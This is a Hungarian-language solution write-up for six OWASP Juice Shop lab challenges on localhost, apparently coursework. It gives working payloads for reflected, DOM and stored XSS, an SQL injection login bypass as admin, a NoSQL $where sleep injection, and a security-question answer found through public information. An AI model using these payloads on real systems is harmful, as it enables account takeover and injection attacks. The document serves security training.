
## 1. feladat - reflected XSS

### Megoldas

Sebezhetoseg:
Mivel az URL-ben szerepel az `id=` ami meg is jelenik a weblapon es a rendszer nem ellenorzi a menetet a valaszhoz, ezert ehelyere barmit betehetunk.

Link:
```text
http://localhost:3000/#/track-result?id=<iframe src="javascript:alert(`xss`)">
```

## 2. feladat - DOM XSS

### Megoldas

Sebezhetoseg:
```html
<span id="searchValue" [innerHTML]="searchValue"></span>
```

Kereso mezobe:
```html
<img src="x" onerror="alert(`xss`)">
```

Hiba: mivel a kodban innerHTML szerepel ez megmondja a bongeszonek, hogy azt a reszt konkret HTML kodkent ertelmezze es ne szovegkent.

## 3. feladat - persistent XSS

### Megoldas

Sebezhetoseg:
A /administration oldalon megjelenik az osszes regisztralt felhasznalo emailcime.
A frontenden van validacio az emailre, de a backenden nincs, tehat ha nem a formot kitoltve regisztralunk, hanem az apinak kuldjuk el a post kerest, akkor elfogadja, es amint ujra megnyilik.

Regisztracios pelda JSON:
```http
POST : http://localhost:3000/api/Users/
{"email":"<img src='x' onerror='alert(\"xss\")'>","password":"ttttt","passwordRepeat":"ttttt","securityQuestion":{"id":5,"question":"Maternal grandmother's first name?","createdAt":"2026-05-08T07:17:04.195Z","updatedAt":"2026-05-08T07:17:04.195Z"},"securityAnswer":"a"}
```

### 4. feladat - SQL injection admin jog

Sebezhetoseg: a kod igy nez ki:
```sql
models.sequelize.query(`SELECT * FROM Users WHERE email = '${req.body.email || ''}' AND password = '${security.hash(req.body.password || '')}'`
```

Mivel a req.body-ba az email berul ezert siman atlehet irni a parancsot, hogy az SQL true-t adjon.

Mivel ismerjuk az admin emailt, ezert mar csak azt kell megoldani hogy elfogadjon barmilyen jelszot hozza.
A login nal az emailhez: admin@juice-sh.op'-- ezzel bezarjuk az emailes kereset es a tobbi komment lesz, az email letezik ezert barmilyen jelszoval beenged.

### 5. feladat - Server pihentettes

Sebezhetoseg:
A szerver kodja a lekerdezest osszefuzi ellenorzes nelkul. $where miatt az adatbazis motoron belul JavaScript code fut.

```text
http://localhost:3000/rest/products/1%20%26%26sleep(1900)/reviews
```

Ezzel lefut a sleep minden reviewnal a 1.9s-es varakozas.

### 6. feladat - Jim

Sebezhetoseg:
Mivel a biztonsagi kerdes az volt, hogy az idosebb testver neve.
A mentett helyeibol kiderul hogy o James T. Kirk, akinek a batyja George Samuel Kirk, tehat Samuel a valasz ra.





